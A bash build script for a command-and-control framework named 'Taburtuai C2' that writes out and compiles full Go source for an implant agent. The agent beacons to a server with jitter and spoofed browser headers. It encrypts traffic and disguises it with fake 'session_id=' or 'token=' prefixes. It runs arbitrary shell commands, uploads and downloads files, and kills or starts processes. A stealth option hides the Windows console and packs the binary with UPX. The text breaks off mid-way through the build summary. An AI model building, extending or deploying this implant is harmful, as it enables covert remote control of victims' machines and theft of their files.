#!/bin/bash

# Enhanced Agent Build Script for Taburtuai C2
set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Defaults
DEFAULT_SERVER_URL="http://127.0.0.1:8080"
DEFAULT_KEY="SpookyOrcaC2AES1"
DEFAULT_SECONDARY_KEY="TaburtuaiSecondary"
DEFAULT_INTERVAL="30"
DEFAULT_JITTER="0.3"

BUILD_DIR="./bin"
AGENT_DIR="./agent"
STAGELESS_DIR="$AGENT_DIR/stageless"

print_status() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_usage() {
    cat << 'USAGE_EOF'
Enhanced Agent Build Script for Taburtuai C2

Usage: ./build_agent.sh [OPTIONS]

Options:
    -s, --server URL        C2 server URL (default: http://127.0.0.1:8080)
    -k, --key KEY          Primary encryption key (default: SpookyOrcaC2AES1)
    -i, --interval SEC     Beacon interval in seconds (default: 30)
    -j, --jitter FLOAT     Jitter factor 0.0-1.0 (default: 0.3)
    -o, --os TARGET        Target OS: windows, linux, darwin (default: current)
    -a, --arch ARCH        Target architecture: amd64, 386 (default: amd64)
    -n, --name NAME        Output filename (default: auto-generated)
    -S, --stealth          Enable stealth compilation options
    -c, --compress         Compress final binary with UPX
    -h, --help             Show this help message

Examples:
    # Build basic agent
    ./build_agent.sh

    # Build for Windows with custom server
    ./build_agent.sh -s http://192.168.1.100:8080 -o windows

    # Build with stealth options
    ./build_agent.sh -S -c -o windows
USAGE_EOF
}

validate_params() {
    print_status "Validating build parameters..."
    
    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 1 ]; then
        print_error "Invalid interval: $INTERVAL"
        exit 1
    fi
    
    case "$TARGET_OS" in
        windows|linux|darwin) ;;
        *) print_error "Invalid OS: $TARGET_OS"; exit 1 ;;
    esac
    
    case "$TARGET_ARCH" in
        amd64|386) ;;
        *) print_error "Invalid arch: $TARGET_ARCH"; exit 1 ;;
    esac
    
    print_success "Parameters validated"
}

setup_build_env() {
    print_status "Setting up build environment..."
    
    mkdir -p "$BUILD_DIR" "$AGENT_DIR" "$STAGELESS_DIR"
    
    if [ ! -f "$STAGELESS_DIR/go.mod" ]; then
        cat > "$STAGELESS_DIR/go.mod" << 'MOD_EOF'
module enhanced-agent

go 1.21

require ()
MOD_EOF
    fi
    
    print_success "Build environment setup complete"
}

create_agent_source() {
    print_status "Creating enhanced agent source with command execution, file operations, and process management..." # Pesan diubah
    
    local source_file="$STAGELESS_DIR/main.go" #
    
    cat > "$source_file" << 'AGENT_SOURCE_EOF'

package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
    "io/ioutil" 
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Configuration - will be replaced during build
var (
	defaultServerURL    = "PLACEHOLDER_SERVER_URL"
	defaultKey          = "PLACEHOLDER_KEY"
	defaultSecondaryKey = "PLACEHOLDER_SECONDARY_KEY"
	defaultInterval     = "PLACEHOLDER_INTERVAL"
	defaultJitter       = "PLACEHOLDER_JITTER"
)

// CryptoManager handles decryption
type CryptoManager struct {
	primaryKey   []byte
	secondaryKey []byte
	gcm          cipher.AEAD
}

type Agent struct {
	ID            string
	ServerURL     string
	EncryptionKey string 
	Interval      time.Duration
	Jitter        float64
	isRunning     bool
	client        *http.Client
	crypto        *CryptoManager
}

type AgentInfo struct {
	ID            string `json:"id"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	OS            string `json:"os"`
	Architecture  string `json:"architecture"`
	ProcessID     int    `json:"process_id"`
	Privileges    string `json:"privileges"`
	WorkingDir    string `json:"working_dir"`
}

// --- MODIFIKASI DI SINI ---
// Struktur Command disesuaikan dengan server, termasuk field untuk manajemen proses
type Command struct {
	ID              string   `json:"id"`
	AgentID         string   `json:"agent_id"` 
	Command         string   `json:"command"`
	Args            []string `json:"args,omitempty"` // Untuk 'execute' jika dipisah
	WorkingDir      string   `json:"working_dir,omitempty"`
	Timeout         int      `json:"timeout,omitempty"`
	OperationType   string   `json:"operation_type,omitempty"`   // "upload", "download", "execute", "process_list", "process_kill", "process_start"
	SourcePath      string   `json:"source_path,omitempty"`      // Untuk download
	DestinationPath string   `json:"destination_path,omitempty"` // Untuk upload
	FileContent     []byte   `json:"file_content,omitempty"`   // Untuk upload (data terenkripsi dari server)
	IsEncrypted     bool     `json:"is_encrypted,omitempty"`     // Menandakan apakah FileContent perlu didekripsi oleh agent

	// Fields for Process Management (SINKRONKAN DENGAN SERVER)
	ProcessName     string   `json:"process_name,omitempty"`
	ProcessID       int      `json:"process_id,omitempty"`
	ProcessPath     string   `json:"process_path,omitempty"`
	ProcessArgs     string   `json:"process_args,omitempty"` // Agent akan mem-parse ini jika perlu array
}
// --- AKHIR MODIFIKASI ---

type CommandResult struct {
	CommandID string `json:"command_id"`
	ExitCode  int    `json:"exit_code"`
	Output    string `json:"output"`    
	Error     string `json:"error"`
	Encrypted bool   `json:"encrypted"` 
}

// ... (sisa fungsi generateUUID, NewCryptoManager, DecryptData, EncryptData, dan helper enkripsi lainnya tetap sama seperti sebelumnya) ...
func generateUUID() string {
        b := make([]byte, 16)
        _, err := rand.Read(b)
        if err != nil {
                now := time.Now().UnixNano()
                for i := range b {
                        b[i] = byte((now >> (i * 8)) & 0xFF)
                }
        }
        b[6] = (b[6] & 0x0f) | 0x40
        b[8] = (b[8] & 0x3f) | 0x80
        return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
func NewCryptoManager(primaryKey, secondaryKey string) (*CryptoManager, error) {
        pKey := sha256.Sum256([]byte(primaryKey))
        sKey := sha256.Sum256([]byte(secondaryKey))
        block, err := aes.NewCipher(pKey[:])
        if err != nil { return nil, fmt.Errorf("failed to create cipher: %v", err) }
        gcm, err := cipher.NewGCM(block)
        if err != nil { return nil, fmt.Errorf("failed to create GCM: %v", err) }
        return &CryptoManager{ primaryKey: pKey[:], secondaryKey: sKey[:], gcm: gcm, }, nil
}
func (cm *CryptoManager) DecryptData(obfuscatedData string) ([]byte, error) {
    encoded := cm.removeObfuscationMarkers(obfuscatedData)
    combined, err := cm.customBase64Decode(encoded)
    if err != nil { return nil, fmt.Errorf("base64 decode failed: %v", err) }
    if len(combined) < cm.gcm.NonceSize() { return nil, fmt.Errorf("invalid data size: got %d, need at least %d", len(combined), cm.gcm.NonceSize()) }
    nonce := combined[:cm.gcm.NonceSize()]
    encrypted := combined[cm.gcm.NonceSize():]
    padded, err := cm.gcm.Open(nil, nonce, encrypted, nil)
    if err != nil { return nil, fmt.Errorf("decryption failed: %v", err) }
    compressed := cm.removePadding(padded)
    data, err := cm.decompressData(compressed)
    if err != nil { return nil, fmt.Errorf("decompression failed: %v", err) }
    return data, nil
}
func (cm *CryptoManager) EncryptData(data []byte) (string, error) {
    compressed, err := cm.compressData(data)
    if err != nil { return "", fmt.Errorf("compression failed: %v", err) }
    padded := cm.addPadding(compressed)
    nonce := make([]byte, cm.gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil { return "", fmt.Errorf("nonce generation failed: %v", err) }
    encrypted := cm.gcm.Seal(nil, nonce, padded, nil)
    combined := append(nonce, encrypted...)
    encoded := base64.StdEncoding.EncodeToString(combined)
    obfuscated := cm.addObfuscationMarkers(encoded)
    return obfuscated, nil
}
func (cm *CryptoManager) compressData(data []byte) ([]byte, error) {
    var buf bytes.Buffer; writer := gzip.NewWriter(&buf)
    if _, err := writer.Write(data); err != nil { return nil, err }
    if err := writer.Close(); err != nil { return nil, err }
    return buf.Bytes(), nil
}
func (cm *CryptoManager) addPadding(data []byte) []byte {
    paddingSize := 1 + (len(data) % 16); padding := make([]byte, paddingSize); rand.Read(padding)
    result := make([]byte, 1+paddingSize+len(data)); result[0] = byte(paddingSize)
    copy(result[1:1+paddingSize], padding); copy(result[1+paddingSize:], data)
    return result
}
func (cm *CryptoManager) addObfuscationMarkers(data string) string {
    markers := []string{"session_id=", "token=", "data=", "payload=", "content=", "response="}
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(markers)))); marker := markers[n.Int64()]
    return marker + data
}
func (cm *CryptoManager) removeObfuscationMarkers(data string) string {
    markers := []string{"session_id=", "token=", "data=", "payload=", "content=", "response="}
    for _, marker := range markers { if strings.HasPrefix(data, marker) { return data[len(marker):] } }
    return data
}
func (cm *CryptoManager) customBase64Decode(encoded string) ([]byte, error) { return base64.StdEncoding.DecodeString(encoded) }
func (cm *CryptoManager) removePadding(data []byte) []byte {
    if len(data) < 2 { return data }; paddingSize := int(data[0])
    if paddingSize >= len(data) { return data }; return data[1+paddingSize:]
}
func (cm *CryptoManager) decompressData(data []byte) ([]byte, error) {
    reader, err := gzip.NewReader(bytes.NewReader(data)); if err != nil { return nil, err }
    defer reader.Close(); return io.ReadAll(reader)
}


func NewAgent() (*Agent, error) {
	// ... (fungsi NewAgent tetap sama) ...
        interval, _ := strconv.Atoi(defaultInterval)
        if interval < 1 { interval = 30 }
        jitter, _ := strconv.ParseFloat(defaultJitter, 64)
        if jitter < 0 || jitter > 1 { jitter = 0.3 }
        fmt.Printf("[DEBUG] Primary Key: %s\n", defaultKey)
        fmt.Printf("[DEBUG] Secondary Key: %s\n", defaultSecondaryKey)
	    crypto, err := NewCryptoManager(defaultKey, defaultSecondaryKey)
        if err != nil {
                fmt.Printf("[!] Failed to initialize crypto: %v\n", err)
                crypto = nil 
        }
        return &Agent{
                ID:            generateUUID(),
                ServerURL:     defaultServerURL,
                Interval:      time.Duration(interval) * time.Second,
                Jitter:        jitter,
                isRunning:     false,
                client:        &http.Client{Timeout: 60 * time.Second}, 
                crypto:        crypto,
        }, nil
}

func (a *Agent) collectAgentInfo() AgentInfo {
	// ... (fungsi collectAgentInfo tetap sama) ...
        hostname, _ := os.Hostname()
        username := os.Getenv("USER")
        if username == "" { username = os.Getenv("USERNAME") }
        workDir, _ := os.Getwd()
        privileges := "user"
        if runtime.GOOS == "windows" {
                _, err := os.Open("\\\\.\\PHYSICALDRIVE0")
                if err == nil { privileges = "admin" }
        } else {
                if os.Geteuid() == 0 { privileges = "root" }
        }
        return AgentInfo{
                ID:           a.ID,
                Hostname:     hostname,
                Username:     username,
                OS:           runtime.GOOS,
                Architecture: runtime.GOARCH,
                ProcessID:    os.Getpid(),
                Privileges:   privileges,
                WorkingDir:   workDir,
        }
}

func (a *Agent) checkin() error {
    // ... (fungsi checkin tetap sama) ...
    agentInfo := a.collectAgentInfo()
    var payload []byte
    var err error
    agentInfoJSON, err := json.Marshal(agentInfo)
    if err != nil { return err }

    if a.crypto != nil {
        encrypted, errEnc := a.crypto.EncryptData(agentInfoJSON)
        if errEnc != nil {
            fmt.Printf("[!] Failed to encrypt agent info for checkin: %v\n", errEnc)
            payload = agentInfoJSON 
        } else {
            envelope := map[string]interface{}{"encrypted_payload": encrypted} 
            payload, err = json.Marshal(envelope)
            if err != nil { return err }
            fmt.Printf("[*] Checkin data encrypted\n")
        }
    } else {
        payload = agentInfoJSON
    }
    url := a.ServerURL + "/api/v1/checkin"
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
    if err != nil { return err }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", "Mozilla/5.0")
    resp, err := a.client.Do(req)
    if err != nil { return err }
    defer resp.Body.Close()
    if resp.StatusCode != http.StatusOK {
        bodyBytes, _ := io.ReadAll(resp.Body)
        return fmt.Errorf("checkin failed with status %d: %s", resp.StatusCode, string(bodyBytes))
    }
    return nil
}


func (a *Agent) getNextCommand() (*Command, error) {
    // ... (fungsi getNextCommand tetap sama) ...
    url := fmt.Sprintf("%s/api/v1/command/%s/next", a.ServerURL, a.ID)
    req, err := http.NewRequest("GET", url, nil)
    if err != nil { return nil, err }
    req.Header.Set("User-Agent", "Mozilla/5.0")

    resp, err := a.client.Do(req)
    if err != nil { return nil, err }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusNoContent { return nil, nil }
    if resp.StatusCode != http.StatusOK {
        return nil, fmt.Errorf("server returned status %d for getNextCommand", resp.StatusCode)
    }

    body, err := io.ReadAll(resp.Body)
    if err != nil { return nil, err }
    if len(body) == 0 { return nil, nil }

    var response struct {
        Success bool        `json:"success"`
        Data    interface{} `json:"data"`
        Error   string      `json:"error"`
    }
    if err := json.Unmarshal(body, &response); err != nil {
        return nil, fmt.Errorf("failed to parse initial JSON from server: %v\nBody: %s", err, string(body))
    }
    if !response.Success { return nil, fmt.Errorf("server error on getNextCommand: %s", response.Error) }
    if response.Data == nil { return nil, nil }

    var cmdDataBytes []byte
    
    if dataMap, ok := response.Data.(map[string]interface{}); ok {
        if encryptedStr, ok := dataMap["encrypted"].(string); ok {
            fmt.Printf("[*] Received encrypted command, decrypting...\n")
            if a.crypto != nil {
                decrypted, err := a.crypto.DecryptData(encryptedStr)
                if err != nil {
                    fmt.Printf("[!] Decryption failed for getNextCommand: %v\n", err)
                    return nil, fmt.Errorf("command decryption failed: %v", err)
                }
                cmdDataBytes = decrypted
                fmt.Printf("[+] Command decrypted successfully: %s\n", string(cmdDataBytes))
            } else {
                fmt.Printf("[!] No crypto manager for encrypted command!\n")
                return nil, fmt.Errorf("received encrypted command but no crypto manager")
            }
        } else { 
            cmdDataBytes, err = json.Marshal(response.Data)
            if err != nil {
                return nil, fmt.Errorf("failed to marshal unencrypted command data: %v", err)
            }
        }
    } else { 
          cmdDataBytes, err = json.Marshal(response.Data)
          if err != nil {
              return nil, fmt.Errorf("failed to process command data structure: %v", err)
          }
    }
    
    var cmd Command
    if err := json.Unmarshal(cmdDataBytes, &cmd); err != nil {
        fmt.Printf("[!] Failed to parse command JSON: %v\nData: %s\n", err, string(cmdDataBytes))
        return nil, fmt.Errorf("failed to parse command: %v", err)
    }
    return &cmd, nil
}

func (a *Agent) executeCommand(cmd *Command) *CommandResult {
	result := &CommandResult{
		CommandID: cmd.ID,
		ExitCode:  0, 
	}

	fmt.Printf("[*] Executing command (ID: %s), Type: %s, Details: %s\n", cmd.ID, cmd.OperationType, cmd.Command)

	originalDir, _ := os.Getwd()
	if cmd.WorkingDir != "" {
		if err := os.Chdir(cmd.WorkingDir); err != nil {
			result.Error = fmt.Sprintf("Failed to change directory to %s: %v", cmd.WorkingDir, err)
			result.ExitCode = 1
			return result
		}
		defer os.Chdir(originalDir)
		fmt.Printf("[*] Changed working directory to: %s\n", cmd.WorkingDir)
	}

	switch cmd.OperationType {
	case "upload":
		// ... (logika upload tetap sama) ...
		fmt.Printf("[*] Handling upload operation. Dest: %s\n", cmd.DestinationPath)
		if cmd.DestinationPath == "" {
			result.Error = "Destination path for upload is missing"
			result.ExitCode = 1
			return result
		}
		if cmd.FileContent == nil {
			result.Error = "File content for upload is missing"
			result.ExitCode = 1
			return result
		}
		fileData := cmd.FileContent
		if cmd.IsEncrypted && a.crypto != nil {
			fmt.Printf("[*] File content is encrypted, decrypting (size: %d bytes)...\n", len(fileData))
			decryptedData, err := a.crypto.DecryptData(string(fileData))
			if err != nil {
				result.Error = fmt.Sprintf("Failed to decrypt file content for upload: %v", err)
				result.ExitCode = 1
				return result
			}
			fileData = decryptedData
			fmt.Printf("[+] File content decrypted (new size: %d bytes)\n", len(fileData))
		} else if cmd.IsEncrypted && a.crypto == nil {
			result.Error = "Received encrypted file content but no crypto manager on agent"
			result.ExitCode = 1
			return result
		}
		err := ioutil.WriteFile(cmd.DestinationPath, fileData, 0644) 
		if err != nil {
			result.Error = fmt.Sprintf("Failed to write file to %s: %v", cmd.DestinationPath, err)
			result.ExitCode = 1
		} else {
			result.Output = fmt.Sprintf("File uploaded successfully to %s", cmd.DestinationPath)
			fmt.Printf("[+] File successfully written to: %s\n", cmd.DestinationPath)
		}


	case "download":
		// ... (logika download tetap sama) ...
		fmt.Printf("[*] Handling download operation. Source: %s\n", cmd.SourcePath)
		if cmd.SourcePath == "" {
			result.Error = "Source path for download is missing"
			result.ExitCode = 1
			return result
		}
		fileData, err := ioutil.ReadFile(cmd.SourcePath) 
		if err != nil {
			result.Error = fmt.Sprintf("Failed to read file from %s: %v", cmd.SourcePath, err)
			result.ExitCode = 1
		} else {
			fmt.Printf("[*] Read %d bytes from %s. Encrypting for transport...\n", len(fileData), cmd.SourcePath)
			if a.crypto != nil {
				encryptedDataString, errEnc := a.crypto.EncryptData(fileData)
				if errEnc != nil {
					result.Error = fmt.Sprintf("Failed to encrypt file content for download: %v", errEnc)
					result.ExitCode = 1
				} else {
					result.Output = encryptedDataString 
					result.Encrypted = true
					fmt.Printf("[+] File content encrypted for download (original: %d bytes, encrypted: %d chars)\n", len(fileData), len(encryptedDataString))
				}
			} else {
				result.Output = base64.StdEncoding.EncodeToString(fileData)
				result.Encrypted = false 
				fmt.Printf("[!] Crypto not available. Sending file content as Base64 string.\n")
			}
		}
        
    case "process_list": // Logika dari respons sebelumnya
        fmt.Printf("[*] Handling process list operation\n")
        var cmdOut []byte
        var err error
        if runtime.GOOS == "windows" {
            execCmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "Get-Process | Select-Object Id,Handles,CPU,WorkingSet,ProcessName,Description,Path | ConvertTo-Json -Compress -Depth 1")
            cmdOut, err = execCmd.CombinedOutput()
        } else { 
            execCmd := exec.Command("ps", "-eo", "pid,comm,user,args", "--no-headers")
            cmdOut, err = execCmd.CombinedOutput()
        }
        if err != nil {
            result.Error = fmt.Sprintf("Failed to list processes: %v\nOutput: %s", err, string(cmdOut))
            result.ExitCode = 1
        } else {
            result.Output = strings.TrimSpace(string(cmdOut))
        }

    case "process_kill": // Logika dari respons sebelumnya
        target := ""
        if cmd.ProcessID != 0 { // Menggunakan cmd.ProcessID
            target = strconv.Itoa(cmd.ProcessID)
            fmt.Printf("[*] Handling process kill operation for PID: %s\n", target)
            if runtime.GOOS == "windows" {
                execCmd := exec.Command("taskkill", "/F", "/PID", target)
                cmdOut, err := execCmd.CombinedOutput(); if err != nil { result.Error = fmt.Sprintf("Failed to kill process PID %s: %v\n%s", target, err, string(cmdOut)); result.ExitCode = 1 } else { result.Output = fmt.Sprintf("Kill signal sent to PID %s.\n%s", target, string(cmdOut)) }
            } else { 
                execCmd := exec.Command("kill", "-9", target); if err := execCmd.Run(); err != nil { result.Error = fmt.Sprintf("Failed to kill process PID %s: %v", target, err); result.ExitCode = 1 } else { result.Output = fmt.Sprintf("Kill signal sent to PID %s.", target) }
            }
        } else if cmd.ProcessName != "" { // Menggunakan cmd.ProcessName
            target = cmd.ProcessName
            fmt.Printf("[*] Handling process kill operation for Name: %s\n", target)
            if runtime.GOOS == "windows" {
                execCmd := exec.Command("taskkill", "/F", "/IM", target); 
                cmdOut, err := execCmd.CombinedOutput(); if err != nil { result.Error = fmt.Sprintf("Failed to kill process name %s: %v\n%s", target, err, string(cmdOut)); result.ExitCode = 1 } else { result.Output = fmt.Sprintf("Kill signal sent to name %s.\n%s", target, string(cmdOut)) }
            } else { 
                execCmd := exec.Command("pkill", "-9", "-f", target); if err := execCmd.Run(); err != nil { result.Error = fmt.Sprintf("Failed to kill process name %s: %v", target, err); result.ExitCode = 1 } else { result.Output = fmt.Sprintf("Kill signal sent to name %s.", target) }
            }
        } else {
            result.Error = "Process ID or Name not provided for kill"; result.ExitCode = 1
        }

    case "process_start": // Logika dari respons sebelumnya
        fmt.Printf("[*] Handling process start operation for: %s %s\n", cmd.ProcessPath, cmd.ProcessArgs) // Menggunakan cmd.ProcessPath & cmd.ProcessArgs
        if cmd.ProcessPath == "" { result.Error = "Process path not provided"; result.ExitCode = 1; return result }
        var args []string
        if cmd.ProcessArgs != "" { args = strings.Fields(cmd.ProcessArgs) }
        execCmd := exec.Command(cmd.ProcessPath, args...)
        cmdOut, err := execCmd.CombinedOutput()
        if err != nil { result.Error = fmt.Sprintf("Failed to start process %s: %v\n%s", cmd.ProcessPath, err, string(cmdOut)); result.ExitCode = 1 } else { result.Output = fmt.Sprintf("Process %s started.\n%s", cmd.ProcessPath, string(cmdOut)) }

	case "execute":
		fallthrough 
	default: 
		fmt.Printf("[*] Handling command execution: %s\n", cmd.Command)
		ctx := context.Background()
		if cmd.Timeout > 0 {
			var cancel context.CancelFunc
			ctx, cancel = context.WithTimeout(context.Background(), time.Duration(cmd.Timeout)*time.Second)
			defer cancel()
		}
		var execCmd *exec.Cmd
		fullCommand := cmd.Command 
		if len(cmd.Args) > 0 { 
		    execCmd = exec.CommandContext(ctx, cmd.Command, cmd.Args...)
		} else { 
            if runtime.GOOS == "windows" {
                execCmd = exec.CommandContext(ctx, "cmd", "/C", fullCommand)
            } else {
                execCmd = exec.CommandContext(ctx, "sh", "-c", fullCommand)
            }
		}
		var stdout, stderr bytes.Buffer
		execCmd.Stdout = &stdout
		execCmd.Stderr = &stderr
		err := execCmd.Run()
		result.Output = strings.TrimSpace(stdout.String())
		result.Error = strings.TrimSpace(stderr.String())
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok { result.ExitCode = exitError.ExitCode()
			} else { result.ExitCode = 1; if result.Error == "" { result.Error = err.Error() } }
			fmt.Printf("[!] Command execution failed (Code: %d): %s\n", result.ExitCode, result.Error)
		} else {
			fmt.Printf("[+] Command executed successfully (Code: %d)\n", result.ExitCode)
		}
	}

	if a.crypto != nil && ! (cmd.OperationType == "download" && result.Encrypted) {
		outputToEncrypt := result.Output; errorToEncrypt := result.Error; finalResultEncrypted := false
		if outputToEncrypt != "" {
			encryptedOutput, err := a.crypto.EncryptData([]byte(outputToEncrypt))
			if err == nil { result.Output = encryptedOutput; finalResultEncrypted = true
			} else { fmt.Printf("[!] Failed to encrypt result output: %v\n", err) }
		}
		if errorToEncrypt != "" {
			encryptedError, err := a.crypto.EncryptData([]byte(errorToEncrypt))
			if err == nil { result.Error = encryptedError; finalResultEncrypted = true
			} else { fmt.Printf("[!] Failed to encrypt result error: %v\n", err) }
		}
		if finalResultEncrypted { result.Encrypted = true; fmt.Printf("[*] Result fields (output/error) encrypted for submission.\n") }
	}

	if result.Output != "" && len(result.Output) > 50 { fmt.Printf("[OUTPUT PREVIEW] %s...\n", result.Output[:50])
	} else if result.Output != ""{ fmt.Printf("[OUTPUT] %s\n", result.Output) }
	if result.Error != "" { fmt.Printf("[ERROR] %s\n", result.Error) }
	return result
}

func (a *Agent) submitResult(result *CommandResult) error {
    // ... (fungsi submitResult tetap sama) ...
    var payload []byte
    var err error
    resultJSON, err := json.Marshal(result)
    if err != nil { return fmt.Errorf("failed to marshal command result: %v", err) }
    if a.crypto != nil {
        encryptedPayload, errEnc := a.crypto.EncryptData(resultJSON)
        if errEnc != nil {
            fmt.Printf("[!] Failed to encrypt result payload: %v. Sending plaintext.\n", errEnc)
            payload = resultJSON 
        } else {
            envelope := map[string]string{"encrypted_payload": encryptedPayload}
            payload, err = json.Marshal(envelope)
            if err != nil { return fmt.Errorf("failed to marshal encrypted result envelope: %v", err) }
            fmt.Printf("[+] Result payload encrypted for submission (CommandID: %s)\n", result.CommandID)
        }
    } else {
        payload = resultJSON
        fmt.Printf("[!] No crypto manager. Sending result payload as plaintext (CommandID: %s)\n", result.CommandID)
    }
    url := a.ServerURL + "/api/v1/command/result"
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
    if err != nil { return err }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", "Mozilla/5.0")
    resp, err := a.client.Do(req)
    if err != nil { return err }
    defer resp.Body.Close()
    if resp.StatusCode != http.StatusOK {
        bodyBytes, _ := io.ReadAll(resp.Body)
        return fmt.Errorf("submit result failed with status %d: %s", resp.StatusCode, string(bodyBytes))
    }
    fmt.Printf("[+] Result submitted successfully for CommandID: %s\n", result.CommandID)
    return nil
}

func (a *Agent) getBeaconInterval() time.Duration {
	// ... (fungsi getBeaconInterval tetap sama) ...
        if a.Jitter <= 0 { return a.Interval }
        jitterRange := float64(a.Interval) * a.Jitter; jitterNs := int64(jitterRange)
        if jitterNs <= 0 { return a.Interval }
        b := make([]byte, 8); rand.Read(b)
        randomJitter := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 | int64(b[4])<<24 | int64(b[5])<<16 | int64(b[6])<<8 | int64(b[7])
        randomJitter = randomJitter % (jitterNs * 2); actualJitter := randomJitter - jitterNs
        finalDuration := a.Interval + time.Duration(actualJitter)
        if finalDuration < time.Second { finalDuration = time.Second }
        return finalDuration
}

func (a *Agent) Start() error {
	// ... (fungsi Start tetap sama) ...
        a.isRunning = true
        fmt.Printf("[*] Starting enhanced agent %s\n", a.ID)
        fmt.Printf("[*] Target server: %s\n", a.ServerURL)
        fmt.Printf("[*] Beacon interval: %v (jitter: %.1f%%)\n", a.Interval, a.Jitter*100)
        maxRetries := 3
        for i := 0; i < maxRetries; i++ {
            if err := a.checkin(); err != nil {
                fmt.Printf("[!] Initial checkin attempt %d/%d failed: %v\n", i+1, maxRetries, err)
                if i == maxRetries-1 { return fmt.Errorf("all initial checkin attempts failed: %v", err) }
                time.Sleep(10 * time.Second) 
            } else { fmt.Printf("[+] Initial checkin successful\n"); break }
        }
        for a.isRunning {
            cmd, err := a.getNextCommand()
            if err != nil { fmt.Printf("[!] Failed to get command: %v\n", err)
            } else if cmd != nil && cmd.ID != "" { 
                fmt.Printf("[*] Received command: %s (ID: %s, Type: %s)\n", cmd.Command, cmd.ID, cmd.OperationType)
                result := a.executeCommand(cmd)
                if err := a.submitResult(result); err != nil { fmt.Printf("[!] Failed to submit result for %s: %v\n", cmd.ID, err) }
            } else { fmt.Printf("[*] No pending commands or invalid command received.\n") }
            if err := a.checkin(); err != nil { fmt.Printf("[!] Periodic checkin failed: %v\n", err) }
            sleepDuration := a.getBeaconInterval()
            fmt.Printf("[*] Sleeping for %v\n", sleepDuration)
            time.Sleep(sleepDuration)
        }
        return nil
}

func main() {
	agent, err := NewAgent()
	if err != nil { fmt.Printf("[!] Failed to create agent: %v\n", err); os.Exit(1) }
	if err := agent.Start(); err != nil { fmt.Printf("[!] Agent failed: %v\n", err); os.Exit(1) }
}

AGENT_SOURCE_EOF

    print_success "Enhanced agent source created with decryption, file operations, and process management support" # Pesan diubah
}

prepare_source() {
    print_status "Preparing source code with build configuration..."
    
    local source_file="$STAGELESS_DIR/main.go"
    
    if [ ! -f "$source_file" ]; then
        print_error "Agent source file not found: $source_file"
        exit 1
    fi
    
    # Replace placeholders
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_SECONDARY_KEY|$DEFAULT_SECONDARY_KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    else
        sed -i \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_SECONDARY_KEY|$DEFAULT_SECONDARY_KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    fi
    
    print_success "Source code prepared"
}

build_agent() {
    print_status "Building enhanced agent..."
    
    if [ -z "$OUTPUT_NAME" ]; then
        OUTPUT_NAME="enhanced_agent_${TARGET_OS}_${TARGET_ARCH}"
        if [ "$TARGET_OS" = "windows" ]; then
            OUTPUT_NAME="${OUTPUT_NAME}.exe"
        fi
    fi
    
    local ldflags=""
    if [ "$STEALTH" = true ]; then
        ldflags="-s -w"
        if [ "$TARGET_OS" = "windows" ]; then
            ldflags="$ldflags -H windowsgui"
        fi
        print_status "Stealth mode enabled"
    fi
    
    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0
    
    print_status "Building for $TARGET_OS/$TARGET_ARCH..."
    
    cd "$STAGELESS_DIR"
    if go build -ldflags "$ldflags" -o "../../$BUILD_DIR/$OUTPUT_NAME" .; then
        print_success "Agent built successfully: $BUILD_DIR/$OUTPUT_NAME"
    else
        print_error "Build failed"
        exit 1
    fi
    cd - > /dev/null
}

compress_binary() {
    if [ "$COMPRESS" = true ]; then
        print_status "Compressing binary with UPX..."
        
        if command -v upx >/dev/null 2>&1; then
            if upx --best "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
                print_success "Binary compressed"
            else
                print_warning "UPX compression failed"
            fi
        else
            print_warning "UPX not found, skipping compression"
        fi
    fi
}

show_summary() {
    local file_size
    if [ -f "$BUILD_DIR/$OUTPUT_NAME" ]; then
        file_size=$(ls -lh "$BUILD_DIR/$OUTPUT_NAME" | awk '{print $5}')
    else
        file_size="Unknown"
    fi
    
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    Enhanced Agent Build Complete                ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Build Details:${NC}"
    echo -e "  Target:          ${YELLOW}$TARGET_OS/$TARGET_ARCH${NC}"
    echo -e "  Output:          ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
